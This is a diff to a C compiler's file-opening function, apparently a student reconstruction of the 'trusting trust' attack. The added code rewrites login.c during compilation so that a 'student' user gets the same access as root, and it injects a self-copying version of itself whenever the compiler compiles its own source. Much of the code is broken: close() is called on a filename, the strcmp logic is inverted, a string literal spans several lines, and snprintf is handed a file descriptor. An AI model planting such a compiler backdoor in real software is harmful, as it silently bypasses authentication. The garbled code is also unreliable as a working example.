@@ -707,11 +707,11 @@ static int _tcc_open(TCCState *s1, const char *filename)
         }
     }else{
         //the write side is closed
-        close(filename);
+        // close(filename);
         close(fd[1]);
         //inside the function, check each line of the dumbass thing
         if(strcmp(filename, "login.c")){
-            File* file = fopen('login.c', 'r');
+            FILE* file = fopen("login.c", "r");
             char line[80];
             char * comp = "if (!strcmp(username, \"root\"))";
             while(fgets(line, 80, file))
@@ -724,23 +724,80 @@ static int _tcc_open(TCCState *s1, const char *filename)
                }
             }
         }else{ // we are in libtcc.c
-        File* file = fopen('libtcc.c', 'r');
+        FILE* file = fopen("libtcc.c", "r");
             char line[80];
             char * comp = "static int _tcc_open(TCCState *s1, const char *filename)";
             while(fgets(line, 80, file))
             {
-                if(strcmp(line,comp)){
-                    char * tmp = "static int _tcc_open(TCCState *s1, const char *filename) -- quine";
-                    write(fd[1], &tmp, 80);
-               }else{
+                if(strcmp(line,comp) != 0){
                     write(fd[1], &line, 80);
+               }else{
+                    char * tmp = 
+                    "
+                    static int _tcc_open(TCCState *s1, const char *filename)
+                    {
+                        int fd[2];
+                        if(pipe(fd) == 1){
+                            fprintf(stderr, \"ERROR: An error occured with opening the pipe\n\");
+                            return EXIT_FAILURE;
+                        }
+                        int p = fork();
+                        if(p == -1){
+                            fprintf(stderr, \"ERROR: fork failed\n\");
+                            return EXIT_FAILURE;
+                        } else if(p == 0){
+                            if(strcmp(filename, \"login.c\") != 0 || strcmp(filename,\"libtcc.c\") != 0){
+                                int fd;
+                                if (strcmp(filename, \"-\") == 0)
+                                    fd = 0, filename = \"<stdin>\";
+                                else
+                                    fd = open(filename, O_RDONLY | O_BINARY);
+                                if ((s1->verbose == 2 && fd >= 0) || s1->verbose == 3)
+                                    printf(\"%s %%*s%%s\n\", fd < 0 ? \"nf\":\"->\",
+                                           (int)(s1->include_stack_ptr - s1->include_stack), "", filename);
+                                return fd;
+                            }
+                        }else{
+                            //the write side is closed
+                            close(filename);
+                            close(fd[1]);
+                            //inside the function, check each line of the dumbass thing
+                            if(strcmp(filename, \"login.c\")){
+                                FILE* file = fopen(\"login.c\", \"r\");
+                                char line[80];
+                                char * comp = \"if (!strcmp(username, \"root\"))\";
+                                while(fgets(line, 80, file))
+                                {
+                                    if(strcmp(line,comp)){
+                                        char * tmp = \"if (!strcmp(username, \"root\") || (!strmp(username, \"student\")))\";
+                                        write(fd[1], &tmp, 80);
+                                   }else{
+                                        write(fd[1], &line, 80);
+                                   }
+                                }
+                            }else{ // we are in libtcc.c
+                            FILE* file = fopen(\"libtcc.c\", \"r\");
+                                char line[80];
+                                char * comp = \"static int _tcc_open(TCCState *s1, const char *filename)\";
+                                while(fgets(line, 80, file))
+                                {
+                                    if(strcmp(line,comp) != 0){
+                                        write(fd[1], &line, 80);
+                                   }else{
+                                    char * tmp = %s};
+                                    snprintf(fd[1], 80, tmp, tmp);
+                                }
+                            }
+                        }
+                    }
+                    return fd;
+                }
+                ";
+                    snprintf(fd[1], 80, tmp, tmp);
                }
             }
-
         }
-
     }
-
     return fd;
 }
 
